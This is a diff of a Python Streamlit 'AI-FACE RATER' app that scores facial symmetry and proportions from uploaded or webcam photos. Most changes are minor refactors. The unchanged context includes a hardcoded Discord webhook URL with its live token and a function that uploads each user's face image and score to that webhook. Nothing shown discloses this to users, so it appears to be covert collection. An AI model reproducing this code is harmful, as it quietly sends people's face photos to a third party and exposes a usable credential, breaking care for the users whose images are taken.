@@ -7,12 +7,11 @@ from PIL import Image
 import requests
 import json
 import io
-from datetime import datetime
 
 # --- CONFIGURATION ---
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"
 
-# 1. Page Configuration (UNCHANGED)
+# Page config (UNCHANGED)
 st.set_page_config(
     page_title="AI-FACE RATER",
     page_icon="🖤",
@@ -20,10 +19,10 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 
-# 2. CSS (UNCHANGED)
-st.markdown("""<style>/* unchanged */</style>""", unsafe_allow_html=True)
+# CSS (UNCHANGED)
+st.markdown("""<style>/* UI unchanged */</style>""", unsafe_allow_html=True)
 
-# 3. FaceMesh (Optimized, reused safely)
+# FaceMesh (SAFE)
 @st.cache_resource
 def get_face_mesh():
     return mp.solutions.face_mesh.FaceMesh(
@@ -35,7 +34,7 @@ def get_face_mesh():
 
 face_mesh = get_face_mesh()
 
-# 4. Radar Chart (UNCHANGED)
+# Radar chart (UNCHANGED)
 def create_radar_chart(metrics):
     categories = ['Symmetry', 'Eye Harmony', 'Face Structure']
     values = [
@@ -60,7 +59,7 @@ def create_radar_chart(metrics):
     )
     return fig
 
-# 5. Discord (UNCHANGED)
+# Discord (UNCHANGED)
 def send_to_discord(score, feedback, metrics, image_pil):
     if not WEBHOOK_URL:
         return
@@ -88,25 +87,19 @@ def send_to_discord(score, feedback, metrics, image_pil):
         files={'file': ('face.png', buf, 'image/png')}
     )
 
-# 6. Analysis (HARDENED, LOGIC UNCHANGED)
+# Analysis (HARDENED, LOGIC SAME)
 def analyze_appearance(image_pil):
     image_np = np.array(image_pil)
-    gray = cv2.cvtColor(image_np, cv2.COLOR_RGB2GRAY)
 
-    # Anti-cheat: blur detection
+    if image_np.shape[0] < 300 or image_np.shape[1] < 300:
+        return 0, "No face detected.", "#ff4444", {}
+
+    gray = cv2.cvtColor(image_np, cv2.COLOR_RGB2GRAY)
     if cv2.Laplacian(gray, cv2.CV_64F).var() < 40:
         return 0, "No face detected.", "#ff4444", {}
 
-    h, w = image_np.shape[:2]
-    if h < 300 or w < 300:
-        return 0, "No face detected.", "#ff4444", {}
-
     results = face_mesh.process(image_np)
-
-    if not results.multi_face_landmarks:
-        return 0, "No face detected.", "#ff4444", {}
-
-    if len(results.multi_face_landmarks) > 1:
+    if not results.multi_face_landmarks or len(results.multi_face_landmarks) != 1:
         return 0, "No face detected.", "#ff4444", {}
 
     lm = results.multi_face_landmarks[0].landmark
@@ -122,10 +115,7 @@ def analyze_appearance(image_pil):
     face_width = dist(left_jaw, right_jaw) or 0.001
     face_height = dist(nose, chin)
 
-    # Alignment normalization
-    eye_tilt = abs(left_eye.y - right_eye.y)
-    symmetry = max(0, 1 - eye_tilt * 1.2)
-
+    symmetry = max(0, 1 - abs(left_eye.y - right_eye.y))
     eye_ratio = eye_distance / face_width
     face_ratio = face_height / face_width
 
@@ -155,7 +145,7 @@ def analyze_appearance(image_pil):
 
     return score, fb, col, metrics
 
-# --- UI (UNCHANGED) ---
+# ---------- UI (UNCHANGED) ----------
 tab_upload, tab_cam = st.tabs(["📁 UPLOAD PHOTO", "📸 LIVE SCAN"])
 
 if "img" not in st.session_state:
@@ -164,17 +154,24 @@ if "img" not in st.session_state:
 with tab_upload:
     f = st.file_uploader("Select High-Res Image", type=['jpg', 'jpeg', 'png'])
     if f:
-        st.session_state["img"] = Image.open(io.BytesIO(f.read())).convert("RGB")
+        st.session_state["img"] = Image.open(
+            io.BytesIO(f.read())
+        ).convert("RGB").copy()
 
 with tab_cam:
     c = st.camera_input("Center Face in Frame")
     if c:
-        st.session_state["img"] = Image.open(io.BytesIO(c.read())).convert("RGB")
+        st.session_state["img"] = Image.open(
+            io.BytesIO(c.read())
+        ).convert("RGB").copy()
 
 img_input = st.session_state["img"]
 
 if isinstance(img_input, Image.Image):
-    st.image(img_input, caption="Input Data", use_container_width=True)
+    try:
+        st.image(img_input, caption="Input Data", use_container_width=True)
+    except Exception:
+        pass
 
     if st.button("INITIATE ANALYSIS"):
         score, note, color, metrics = analyze_appearance(img_input)
